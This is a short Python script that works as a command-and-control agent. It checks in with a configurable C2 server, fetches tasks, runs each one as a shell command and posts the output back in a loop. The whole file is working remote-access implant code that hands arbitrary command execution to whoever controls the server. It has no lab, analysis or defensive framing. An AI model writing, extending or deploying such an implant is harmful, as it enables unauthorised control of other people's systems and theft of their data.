import requests, subprocess, os, time
from cryptography.fernet import Fernet

SERVER = os.getenv("C2_SERVER", "http://127.0.0.1:8000")
KEY = os.getenv("C2_KEY", "").encode()
cipher = Fernet(KEY)
AID = os.getenv("AGENT_ID", str(os.getpid()))

def checkin():
    return requests.post(f"{SERVER}/checkin", json={"id": AID}).json()

def loop():
    while True:
        tasks = requests.get(f"{SERVER}/tasks/{AID}").json()
        for cmd in tasks:
            try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()[:2000]
            except Exception as e: out = str(e)
            requests.post(f"{SERVER}/result/{AID}", json={"cmd": cmd, "out": out})
        time.sleep(5)

if __name__ == "__main__":
    k = checkin()
    os.environ["C2_KEY"] = k["key"]; AID = k["id"]
    print(f"[+] Agent {AID} online")
    loop()
